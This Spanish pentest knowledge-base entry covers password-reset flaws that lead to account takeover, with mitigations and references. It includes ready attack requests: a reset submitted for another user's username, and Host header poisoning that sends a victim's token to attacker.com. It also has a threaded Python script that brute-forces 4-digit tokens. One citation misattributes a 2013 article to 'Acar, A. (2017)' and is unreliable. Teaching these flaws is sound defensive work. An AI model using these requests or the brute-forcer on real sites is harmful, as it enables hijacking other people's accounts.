---
title: Vulnerabilidades en Flujos de Password Reset
slug: explotacion-password-reset-flaws
aliases: [password reset bugs, broken password reset, password reset poisoning, host header injection password reset, token leak via referer, predictable reset token, reset token reuse, account takeover via password reset, ATO via password reset, forgot password vulnerabilities, password recovery flaws, broken reset logic, confused deputy password reset]
fase: [Explotación]
plataforma: Web
dificultad: Intermedia
mitre: [T1556]
related: [explotacion-mfa-bypass, explotacion-brute-force-advanced, explotacion-jwt]
learning_refs: [portswigger/password-reset-broken-logic, portswigger/password-reset-poisoning-via-middleware]
---

# Vulnerabilidades en Flujos de Password Reset

## Descripción
Los flujos de "olvidé mi contraseña" / "recuperar acceso" son una superficie de ataque privilegiada para account takeover (ATO): si el atacante puede inducir un reset sobre la cuenta de la víctima, obtiene credenciales válidas sin necesidad de password ni MFA. Las vulnerabilidades en este flujo aparecen porque mezclan múltiples componentes (tokens, emails, formularios, lógica de validación) y porque el flujo es asíncrono (el usuario no inicia sesión antes de cambiar el password). Errores típicos de implementación: tokens no ligados al usuario objetivo (server confía en username del request), tokens predecibles o sin expiración, tokens leakeados vía `Referer`, password reset poisoning con `Host` header injection, falta de rate-limiting en el endpoint de envío de email (spam/abuso o user enumeration), y respuestas diferenciales que enumeran cuentas.

## Categorías de bugs en password reset

- **Token no ligado al usuario** (este lab): el server valida el token pero usa el `username` del request para decidir a quién aplicar el reset. Atacante con su propio token válido cambia el password de cualquier cuenta.
- **Token predecible**: tokens secuenciales (autoincrement), basados en timestamp, o derivados de datos públicos (email + fecha). Atacante predice tokens y los usa contra cuentas objetivo.
- **Token leakeado vía `Referer`**: la página de reset hace requests a recursos externos (analytics, ads, fonts), el browser manda el `Referer` con el token completo. Tercero lo captura.
- **Token sin expiración o reusable**: tokens que valen indefinidamente o que se pueden usar múltiples veces. Atacante captura uno y lo replay después.
- **Password reset poisoning vía Host header**: el server construye el link de reset usando el header `Host` del request entrante. Atacante envía un `POST /forgot-password` con `Host: attacker.com`; la víctima recibe email con link `https://attacker.com/reset?token=XXX`; al clickear, el token va al atacante.
- **Username/email enumeration vía respuesta diferencial**: `POST /forgot-password` responde distinto si el email existe vs no existe. Side-channel idéntico al de username enumeration en login.
- **Rate-limit ausente en el envío de email**: atacante spam-ea reset emails como vector de molestia, o explota el flow para enumerar cuentas (200 vs 404).
- **Brute-force del token sin rate-limit**: si el token es de baja entropía (4-6 dígitos para flows tipo SMS), brute-force directo del endpoint de reset.

## Herramientas
- **Burp Suite (Repeater + Intruder)** — manipulación del POST de reset (campos hidden tipo username), brute-force de tokens.
- **Burp Collaborator** — para password reset poisoning (capturar el callback al `Host` controlado).
- **Curl / scripts Python con `requests`** — automatización del flow completo (request reset, capturar email, submitir nueva password).

## Comandos / Ejemplos

### Bypass por token no ligado al usuario (este patrón)
```http
POST /forgot-password?temp-forgot-password-token=ABC123 HTTP/2
Host: target.com
Content-Type: application/x-www-form-urlencoded

temp-forgot-password-token=ABC123&username=victim&new-password-1=pwned&new-password-2=pwned
```
Atacante obtuvo `ABC123` para su propia cuenta legítimamente, pero submitea con `username=victim`. Server valida el token (existe en BD), no chequea que pertenezca a `victim`, aplica el reset a `victim`.

### Password reset poisoning via Host header
```http
POST /forgot-password HTTP/2
Host: attacker.com
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
```
Server arma el link de reset como `https://{Host}/reset?token=...`, mandándolo a `victim@target.com`. Al clickear, el browser de la víctima va a `attacker.com` con el token en el query string. Atacante capta y resetea con ese token.

### Brute-force de token de bajo entropy (4 dígitos)
```python
import requests
from concurrent.futures import ThreadPoolExecutor

def try_token(t):
    r = requests.post('https://target.com/reset',
                      data={'token': f'{t:04d}', 'email': '[email protected]',
                            'new-password': 'pwned'},
                      allow_redirects=False)
    return t, r.status_code, len(r.content)

with ThreadPoolExecutor(max_workers=20) as ex:
    for t, status, length in ex.map(try_token, range(10000)):
        if status == 302:
            print(f'Token valido: {t:04d}')
            break
```

## Contramedidas

- **Token ligado al usuario en BD**: schema `(token, user_id, expires_at, consumed)`. El POST de reset deriva el `user_id` **del token**, no del request. Cualquier `username` en el request se ignora o se usa sólo para confirmación visual.
- **Tokens criptográficamente fuertes**: 128+ bits de entropía generados con `secrets.token_urlsafe(32)` (Python) o equivalente. Nunca derivados de datos públicos ni secuenciales.
- **Expiración corta** (15-60 minutos) y **un solo uso**. Tras consumirse o expirar, la entrada se borra/invalida.
- **No incluir el token en URLs que disparan requests externos**. La página de reset debe estar libre de analytics, fonts externas, ads. Headers `Referrer-Policy: no-referrer` mientras esté en esa página.
- **No usar `Host` header del request para construir URLs de reset**. Usar config server-side fija (`PUBLIC_BASE_URL`). Si la app sirve múltiples dominios, validar `Host` contra una allowlist antes de usarlo.
- **Respuesta uniforme en `/forgot-password`**: misma respuesta exista o no el email. Mensaje genérico tipo "Si tu email está registrado, recibirás un enlace". Evita enumeration de cuentas.
- **Rate-limiting per-IP y per-email** en `/forgot-password`. Captcha tras N requests. Evita spam, brute-force de tokens y enumeration.
- **Rate-limiting per-token** en `/reset`. Tras 5 intentos fallidos contra un mismo token, invalidarlo.
- **Notificación al usuario** cuando se solicita un reset y cuando se completa, con info del IP/UA. Detección si el atacante actuó.
- **Logging y alertas** de patrones anómalos: alta tasa de resets, intentos fallidos contra tokens distintos, requests con `Host` header inesperado.

## Referencias
- PortSwigger Web Security Academy. (s.f.). *Other authentication mechanisms*. https://portswigger.net/web-security/authentication/other-mechanisms
- OWASP Foundation. (s.f.). *Forgot Password Cheat Sheet*. https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html
- OWASP Foundation. (s.f.). *Authentication Cheat Sheet*. https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html
- Acar, A. (2017). *Practical HTTP Host header attacks*. https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html — referencia clásica de password reset poisoning vía Host header.
- MITRE Corporation. (2024). *CWE-640: Weak Password Recovery Mechanism for Forgotten Password*. https://cwe.mitre.org/data/definitions/640.html
- MITRE Corporation. (2024). *CWE-841: Improper Enforcement of Behavioral Workflow*. https://cwe.mitre.org/data/definitions/841.html
- MITRE Corporation. (2024). *ATT&CK Technique T1556: Modify Authentication Process*. https://attack.mitre.org/techniques/T1556/
- Stuttard, D., & Pinto, M. (2011). *The Web Application Hacker's Handbook* (2nd ed.). Wiley. Cap. 6 (Attacking Authentication), §6.6 (Forgotten Password).
